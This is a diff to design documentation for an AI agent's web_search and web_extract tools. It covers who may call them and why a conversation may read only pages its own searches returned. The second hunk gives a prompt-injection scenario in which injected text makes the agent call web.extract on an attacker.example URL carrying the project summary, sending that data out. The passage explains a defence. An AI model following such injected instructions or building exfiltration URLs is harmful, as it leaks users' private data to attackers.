@@ -53,7 +53,7 @@ answers, and checks the caller again before handing back the result. They name
 no `conversation` use, so:
 
 - **Pi** offers them to every turn, a reader's too, as `web_search` and
-  `web_extract`, and runs them as the person, with no Run button. A
+  `web_extract`, and runs them as the person. A
   conversation's `web.extract` reads only a page one of that conversation's
   own searches returned (see [Reading pages](#reading-pages));
 - **leased workers** may call them as open reads their policy never names, but
@@ -135,7 +135,7 @@ An address is a request to whoever serves it, and anything an agent has read
 (a project record, a feed item, a search excerpt carrying an injected
 instruction) can be written into one: `web.extract` on
 `https://attacker.example/?d=<the project summary>` would put that summary in
-the attacker's access log. Nobody presses Run on a conversation's read, so
+the attacker's access log. No one checks a conversation's read before it runs, so
 from a conversation `web.extract` reads only an address that one of the same
 conversation's `web.search` answers returned (its fragment ignored), and
 refuses anything else with `web_address_unsearched` before any request, charged
